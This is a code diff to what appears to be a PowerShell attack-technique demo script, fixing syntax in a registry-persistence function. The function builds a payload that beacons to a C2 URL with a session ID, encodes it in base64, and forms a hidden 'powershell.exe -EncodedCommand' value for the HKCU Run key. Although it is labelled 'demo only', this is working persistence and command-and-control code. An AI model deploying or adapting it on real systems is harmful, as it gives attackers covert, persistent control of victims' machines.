@@ -285,9 +285,9 @@ function Set-EnvPayload {
 
 
 # ==========================================================================
-# TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
+# TECHNIQUE 5: REGISTRY PERSISTENCE
 # ==========================================================================
-Show-RegistryPersistence {
+function Show-RegistryPersistence {
     Write-Host "[+] Technique 5: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
 
     $registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -304,7 +304,7 @@ Show-RegistryPersistence {
         Invoke-RestMethod -Uri '$Global:C2Url/?message=hi&session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
         Add-Content -Path '$desktopPath\HI.txt' -Value 'Successfully executed payload via Reg Run Key.' -ErrorAction SilentlyContinue
     } catch { }
-    "@
+"@
 
     $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
     $runValue = "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload"
